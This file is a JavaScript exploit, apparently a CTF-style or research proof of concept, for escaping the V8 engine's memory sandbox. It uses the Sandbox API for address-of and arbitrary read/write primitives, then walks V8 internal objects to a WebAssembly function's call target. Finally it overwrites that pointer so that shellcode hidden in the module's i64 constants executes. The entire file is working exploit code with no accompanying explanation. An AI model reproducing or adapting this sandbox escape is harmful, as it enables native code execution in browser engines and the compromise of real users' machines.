/* constants */

const shared_function_info_offset = 0xc; // offset of shared_function_info in Function
const function_data_offset = 0x4; // offset of function_data in SharedFunctionInfo
const internal_offset = 0x4; // offset of internal in WasmExportedFunctionData
const foreign_address_offset = 0x4; // offset of foreign_address in WasmInternalFunction

const shellcode_offset = 0x65d; // offset of shellcode from call target address


/* helpers */

// convert integer into hex string
function hex(i) { return `0x${i.toString(16)}`; }

// extract lower 4-byte of bigint
function low(bi) { return Number(bi & 0xffffffffn); }

// extract higher 4-byte of bigint
function high(bi) { return Number(bi >> 32n); }

// replace lower 4-byte of a bigint with an integer
function replaceLow(bi, i) {
  bi &= 0xffffffff00000000n;
  bi |= BigInt(i);
  return bi;
}

// replace higher 4-byte of a bigint with an integer
function replaceHigh(bi, i) {
  bi &= 0xffffffffn;
  bi |= BigInt(i) << 32n;
  return bi;
}


/* implement sandboxed exploit primitives */

// obtain address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// arbitrary address read / write
function rw_sbx(addr, value = NaN) {
  let view = new DataView(new Sandbox.MemoryView(addr, 8));

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}


/* escape v8 sandbox */

// create wasm module
let src = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 96, 1, 94, 0, 66, 200, 226, 252, 135, 137, 146, 228, 245, 2, 66, 191, 223, 204, 195, 134, 128, 228, 245, 2, 66, 200, 130, 159, 135, 130, 146, 228, 245, 2, 66, 200, 226, 216, 135, 137, 146, 228, 245, 2, 66, 190, 223, 136, 203, 230, 141, 228, 245, 2, 66, 200, 130, 220, 191, 133, 146, 228, 245, 2, 66, 200, 146, 158, 199, 148, 198, 253, 245, 2, 66, 200, 226, 200, 198, 148, 134, 240, 245, 2, 66, 176, 247, 188, 168, 176, 152, 164, 200, 144, 127, 15, 11]; // wat2wasm pwn.wat
let module = new WebAssembly.Module(new Uint8Array(src));
let instance = new WebAssembly.Instance(module);
let main = instance.exports.main;

// obtain call target address
let main_addr = addrof(main);
console.log(`[+] main_addr == ${hex(main_addr)}`);
let shared_function_info = low(rw_sbx(main_addr + shared_function_info_offset)) & ~1; // SharedFunctionInfo
console.log(`[+] shared_function_info == ${hex(shared_function_info)}`);
let function_data = low(rw_sbx(shared_function_info + function_data_offset)) & ~1; // WasmExportedFunctionData
console.log(`[+] function_data == ${hex(function_data)}`);
let internal = low(rw_sbx(function_data + internal_offset)) & ~1; // WasmInternalFunction
console.log(`[+] internal == ${hex(internal)}`);
let call_target = rw_sbx(internal + foreign_address_offset);
console.log(`[+] call_target == ${hex(call_target)}`);

// execute shellcode
let shellcode_addr = call_target + BigInt(shellcode_offset);
rw_sbx(internal + foreign_address_offset, shellcode_addr); // overwrite call target address with address of shellcode
main();
